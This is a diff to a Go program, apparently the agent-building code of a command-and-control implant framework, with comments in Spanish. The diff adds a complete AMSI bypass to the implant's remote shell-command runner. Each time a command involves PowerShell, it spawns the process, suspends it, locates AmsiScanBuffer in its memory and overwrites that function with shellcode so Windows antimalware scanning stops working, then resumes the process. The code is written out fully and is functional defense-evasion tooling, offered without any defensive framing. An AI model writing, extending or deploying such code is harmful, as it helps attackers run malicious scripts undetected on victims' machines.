@@ -1380,8 +1380,19 @@ func resolvePath(p string) string {
 	return filepath.Join(cwd, p)
 }
 
-// runShell ejecuta un comando shell en el cwd persistente.
+
 func runShell(cmdline string) ([]byte, string) {
+	if runtime.GOOS == "windows" && strings.Contains(strings.ToLower(cmdline), "powershell") {
+		if out, errStr := runShellWindowsAMSI(cmdline); errStr == "" {
+			return out, ""
+		} else if !strings.Contains(errStr, "amsi: no disponible") {
+			// Si el intento con AMSI falla por otra razón (proceso no
+			// arranca, etc.), devolvemos ese error. Solo caemos al método
+			// clásico si AMSI no está disponible en este build.
+			return nil, errStr
+		}
+	}
+
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd.exe", "/C", cmdline)
@@ -2603,6 +2614,377 @@ func sendHTTPEnvelope(env *protocol.Envelope) error {
 // configuración de build no se usan estos símbolos. No tiene efecto
 // en runtime.
 var _ = errors.New
+`
+
+// amsiWindowsSource es el contenido de amsi_windows.go. Se escribe en el
+// directorio de build solo cuando target=windows. Contiene la
+// implementación real del patch de AMSI.
+const amsiWindowsSource = `//go:build windows
+
+package main
+
+import (
+	"fmt"
+	"os"
+	"os/exec"
+	"strings"
+	"syscall"
+	"time"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
+var (
+	amsiKernel32 = windows.NewLazySystemDLL("kernel32.dll")
+	amsiPsapi    = windows.NewLazySystemDLL("psapi.dll")
+
+	procCreateProcessW       = amsiKernel32.NewProc("CreateProcessW")
+	procVirtualProtectEx     = amsiKernel32.NewProc("VirtualProtectEx")
+	procWriteProcessMemory   = amsiKernel32.NewProc("WriteProcessMemory")
+	procResumeThread         = amsiKernel32.NewProc("ResumeThread")
+	procSuspendThread        = amsiKernel32.NewProc("SuspendThread")
+	procWaitForSingleObject  = amsiKernel32.NewProc("WaitForSingleObject")
+	procGetExitCodeProcess   = amsiKernel32.NewProc("GetExitCodeProcess")
+	procCloseHandle          = amsiKernel32.NewProc("CloseHandle")
+	procGetModuleHandleW     = amsiKernel32.NewProc("GetModuleHandleW")
+	procGetProcAddress       = amsiKernel32.NewProc("GetProcAddress")
+	procEnumProcessModulesEx = amsiPsapi.NewProc("EnumProcessModulesEx")
+	procGetModuleBaseNameW   = amsiPsapi.NewProc("GetModuleBaseNameW")
+)
+
+// amsiPatch es el shellcode que se escribe sobre AmsiScanBuffer:
+//
+//	mov eax, 0x80070057   ; E_INVALIDARG
+//	ret
+//
+// Con eso cualquier llamada a AmsiScanBuffer devuelve error inmediato
+// y AMSI deja de detectar. Es la técnica estándar de la industria.
+var amsiPatch = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
+
+const amsiLIST_MODULES_ALL = 0x03
+
+// runShellWindowsAMSI ejecuta una línea de comandos en Windows. Si
+// contiene "powershell", crea el proceso, le parchea AmsiScanBuffer en
+// memoria, y lo reanuda. Si no contiene powershell, ejecuta con
+// cmd.exe normal.
+func runShellWindowsAMSI(cmdline string) ([]byte, string) {
+	lower := strings.ToLower(cmdline)
+	if !strings.Contains(lower, "powershell") {
+		out, err := exec.Command("cmd.exe", "/C", cmdline).CombinedOutput()
+		if err != nil {
+			return out, err.Error()
+		}
+		return out, ""
+	}
+
+	// Extraer la línea de comandos de PowerShell tras "powershell".
+	// Aceptamos las formas:
+	//   powershell -c "..."
+	//   powershell.exe -c "..."
+	//   powershell -Command "..."
+	psCmdline := extractPowerShellCmdline(cmdline)
+	if psCmdline == "" {
+		psCmdline = "powershell.exe " + cmdline
+	}
+
+	out, err := runPowerShellWithAMSIPatch(psCmdline)
+	if err != nil {
+		return nil, fmt.Sprintf("amsi patch: %v", err)
+	}
+	return out, ""
+}
+
+// extractPowerShellCmdline recorta "powershell[.exe] [flags]" del
+// principio de cmdline y deja el resto tal cual, ya listo para
+// CreateProcessW.
+func extractPowerShellCmdline(cmdline string) string {
+	lower := strings.ToLower(cmdline)
+	idx := strings.Index(lower, "powershell")
+	if idx < 0 {
+		return ""
+	}
+	rest := cmdline[idx:]
+	// Recortar "powershell" o "powershell.exe"
+	if strings.HasPrefix(strings.ToLower(rest), "powershell.exe") {
+		rest = rest[len("powershell.exe"):]
+	} else {
+		rest = rest[len("powershell"):]
+	}
+	return "powershell.exe" + rest
+}
+
+// runPowerShellWithAMSIPatch lanza powershell.exe con la línea dada,
+// espera a que cargue amsi.dll, suspende el hilo, parchea AmsiScanBuffer
+// en el proceso remoto, y lo reanuda. Devuelve stdout+stderr del hijo.
+func runPowerShellWithAMSIPatch(psCmdline string) ([]byte, error) {
+	cmdLineW, err := syscall.UTF16PtrFromString(psCmdline)
+	if err != nil {
+		return nil, err
+	}
+
+	var si windows.StartupInfo
+	var pi windows.ProcessInformation
+	si.Cb = uint32(unsafe.Sizeof(si))
+
+	outR, outW, err := osPipe()
+	if err != nil {
+		return nil, err
+	}
+	errR, errW, err := osPipe()
+	if err != nil {
+		outR.Close()
+		outW.Close()
+		return nil, err
+	}
+
+	si.Flags |= windows.STARTF_USESTDHANDLES
+	si.StdOutput = windows.Handle(outW.Fd())
+	si.StdErr = windows.Handle(errW.Fd())
+
+	r, _, errno := procCreateProcessW.Call(
+		0,
+		uintptr(unsafe.Pointer(cmdLineW)),
+		0, 0, 1, // bInheritHandles=1 → los handles StdOutput/StdErr se heredan
+		0,
+		0, 0,
+		uintptr(unsafe.Pointer(&si)),
+		uintptr(unsafe.Pointer(&pi)),
+	)
+	outW.Close()
+	errW.Close()
+	if r == 0 {
+		outR.Close()
+		errR.Close()
+		return nil, fmt.Errorf("CreateProcessW: %v", errno)
+	}
+	defer procCloseHandle.Call(uintptr(pi.Thread))
+	defer procCloseHandle.Call(uintptr(pi.Process))
+
+	// Leer stdout y stderr CONCURRENTEMENTE, una goroutine por pipe.
+	// Sin esto, si el hijo escribe mucho en stderr mientras nadie lee
+	// de ese pipe, el buffer del pipe se llena y el hijo se bloquea
+	// esperando. El padre, mientras tanto, sigue bloqueado en
+	// outR.Read() → deadlock.
+	outputCh := make(chan []byte, 2)
+	readPipe := func(f *os.File) {
+		var buf []byte
+		tmp := make([]byte, 4096)
+		for {
+			n, err := f.Read(tmp)
+			if n > 0 {
+				buf = append(buf, tmp[:n]...)
+			}
+			if err != nil {
+				break
+			}
+		}
+		outputCh <- buf
+	}
+	go readPipe(outR)
+	go readPipe(errR)
+
+	// Dar tiempo a PowerShell a cargar amsi.dll y el CLR.
+	time.Sleep(300 * time.Millisecond)
+
+	if r, _, _ := procWaitForSingleObject.Call(uintptr(pi.Process), 0); r == 0 {
+		debugLog("amsi: powershell terminó antes del patch, saltando")
+		outR.Close()
+		errR.Close()
+		stdout := <-outputCh
+		stderr := <-outputCh
+		return append(stdout, stderr...), nil
+	}
+
+	// Suspender el hilo principal para que no ejecute el script mientras
+	// parcheamos.
+	procSuspendThread.Call(uintptr(pi.Thread))
+
+	if err := patchRemoteAMSI(pi.ProcessId); err != nil {
+		procResumeThread.Call(uintptr(pi.Thread))
+		procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
+		outR.Close()
+		errR.Close()
+		// El hijo termina, los dos readPipe cierran por EOF y envían
+		// sus buffers. Hay exactamente 2 envíos en el channel.
+		<-outputCh
+		<-outputCh
+		return nil, fmt.Errorf("patch: %w", err)
+	}
+
+	// Reanudar y esperar.
+	procResumeThread.Call(uintptr(pi.Thread))
+	procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
+
+	// Cerrar los read-ends fuerza a readPipe a salir aunque el hijo no
+	// haya cerrado sus handles por algún motivo.
+	outR.Close()
+	errR.Close()
+
+	stdout := <-outputCh
+	stderr := <-outputCh
+	combined := append(stdout, stderr...)
+	return combined, nil
+}
+
+func patchRemoteAMSI(pid uint32) error {
+	// 1. Encontrar amsi.dll con ToolHelp32 (no requiere handle abierto).
+	remoteBase, err := findRemoteModuleBase(pid, "amsi.dll")
+	if err != nil {
+		return fmt.Errorf("find amsi.dll: %w", err)
+	}
+
+	// 2. Offset local.
+	localBase, localScanBuf, err := findLocalAmsiScanBuffer()
+	if err != nil {
+		return fmt.Errorf("local amsi: %w", err)
+	}
+	offset := localScanBuf - localBase
+	remoteScanBuf := remoteBase + offset
+
+	debugLog("amsi: remote base=0x%X local base=0x%X offset=0x%X target=0x%X",
+		remoteBase, localBase, offset, remoteScanBuf)
+
+	// 3. Abrir handle para escribir.
+	hProc, err := windows.OpenProcess(
+		windows.PROCESS_VM_OPERATION|
+			windows.PROCESS_VM_WRITE|
+			windows.PROCESS_VM_READ,
+		false,
+		pid,
+	)
+	if err != nil {
+		return fmt.Errorf("OpenProcess: %w", err)
+	}
+	defer windows.CloseHandle(hProc)
+
+	// 4. VirtualProtectEx + WriteProcessMemory.
+	var oldProtect uint32
+	r, _, errno := procVirtualProtectEx.Call(
+		uintptr(hProc),
+		remoteScanBuf,
+		uintptr(len(amsiPatch)),
+		windows.PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if r == 0 {
+		return fmt.Errorf("VirtualProtectEx RWX: %v (addr=0x%X)", errno, remoteScanBuf)
+	}
+
+	var written uintptr
+	r, _, errno = procWriteProcessMemory.Call(
+		uintptr(hProc),
+		remoteScanBuf,
+		uintptr(unsafe.Pointer(&amsiPatch[0])),
+		uintptr(len(amsiPatch)),
+		uintptr(unsafe.Pointer(&written)),
+	)
+	if r == 0 || written != uintptr(len(amsiPatch)) {
+		return fmt.Errorf("WriteProcessMemory: %v (escritos %d)", errno, written)
+	}
+
+	var tmp uint32
+	procVirtualProtectEx.Call(
+		uintptr(hProc),
+		remoteScanBuf,
+		uintptr(len(amsiPatch)),
+		uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&tmp)),
+	)
+
+	debugLog("amsi: patched AmsiScanBuffer @ 0x%X (pid %d)", remoteScanBuf, pid)
+	return nil
+}
+
+func findRemoteModuleBase(pid uint32, name string) (uintptr, error) {
+	// TH32CS_SNAPMODULE (0x08) | TH32CS_SNAPMODULE32 (0x10)
+	const snapFlags = 0x00000018
+
+	snap, err := windows.CreateToolhelp32Snapshot(snapFlags, pid)
+	if err != nil {
+		return 0, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
+	}
+	defer windows.CloseHandle(snap)
+
+	var entry windows.ModuleEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+
+	if err := windows.Module32First(snap, &entry); err != nil {
+		return 0, fmt.Errorf("Module32First: %w", err)
+	}
+
+	for {
+		modName := windows.UTF16ToString(entry.Module[:])
+		if strings.EqualFold(modName, name) {
+			return entry.ModBaseAddr, nil
+		}
+		if err := windows.Module32Next(snap, &entry); err != nil {
+			if err == windows.ERROR_NO_MORE_FILES {
+				break
+			}
+			return 0, fmt.Errorf("Module32Next: %w", err)
+		}
+	}
+	return 0, fmt.Errorf("módulo %q no encontrado", name)
+}
+
+func findLocalAmsiScanBuffer() (uintptr, uintptr, error) {
+	nameW, _ := syscall.UTF16PtrFromString("amsi.dll")
+	h, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(nameW)))
+	if h == 0 {
+		amsi := windows.NewLazySystemDLL("amsi.dll")
+		if err := amsi.Load(); err != nil {
+			return 0, 0, fmt.Errorf("LoadLibrary: %w", err)
+		}
+		h, _, _ = procGetModuleHandleW.Call(uintptr(unsafe.Pointer(nameW)))
+		if h == 0 {
+			return 0, 0, fmt.Errorf("GetModuleHandleW falló tras LoadLibrary")
+		}
+	}
+	procName, _ := syscall.BytePtrFromString("AmsiScanBuffer")
+	p, _, errno := procGetProcAddress.Call(h, uintptr(unsafe.Pointer(procName)))
+	if p == 0 {
+		return 0, 0, fmt.Errorf("GetProcAddress: %v", errno)
+	}
+	return h, p, nil
+}
+
+func osPipe() (*os.File, *os.File, error) {
+	var r, w windows.Handle
+	sa := &windows.SecurityAttributes{
+		Length:        uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
+		InheritHandle: 1,
+	}
+	if err := windows.CreatePipe(&r, &w, sa, 0); err != nil {
+		return nil, nil, err
+	}
+	// El read-end NO debe heredarse.
+	if err := windows.SetHandleInformation(
+		r, windows.HANDLE_FLAG_INHERIT, 0,
+	); err != nil {
+		windows.CloseHandle(r)
+		windows.CloseHandle(w)
+		return nil, nil, err
+	}
+	return os.NewFile(uintptr(r), "rtc2-pipe-r"),
+		os.NewFile(uintptr(w), "rtc2-pipe-w"), nil
+}
+`
+
+// amsiStubSource es el contenido de amsi_stub.go. Se escribe cuando
+// target != windows. Provee el símbolo runShellWindowsAMSI como no-op
+// para que main.go compile.
+const amsiStubSource = `//go:build !windows
+
+package main
+
+import "fmt"
+
+// runShellWindowsAMSI es un no-op en sistemas no-Windows. La variante
+// real está en amsi_windows.go.
+func runShellWindowsAMSI(cmdline string) ([]byte, string) {
+	return nil, fmt.Sprintf("amsi: no disponible en %s", "non-windows")
+}
 `
 
 type TemplateData struct {
